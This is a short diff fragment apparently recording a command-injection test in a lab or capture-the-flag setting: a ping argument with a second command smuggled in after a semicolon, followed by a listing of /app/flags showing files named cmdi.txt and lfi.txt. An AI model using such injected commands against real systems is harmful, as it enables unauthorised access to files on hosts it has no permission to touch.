@@ -1,0 +1,6 @@
+$ ping -c1 127.0.0.1; ls -la /app/flags
+total 16
+drwxr-xr-x 2 root root 4096 Oct 28 03:59 .
+drwxr-xr-x 1 root root 4096 Oct 28 03:59 ..
+-rw-r--r-- 1 root root   28 Oct 28 03:59 cmdi.txt
+-rw-r--r-- 1 root root   25 Oct 28 03:59 lfi.txt
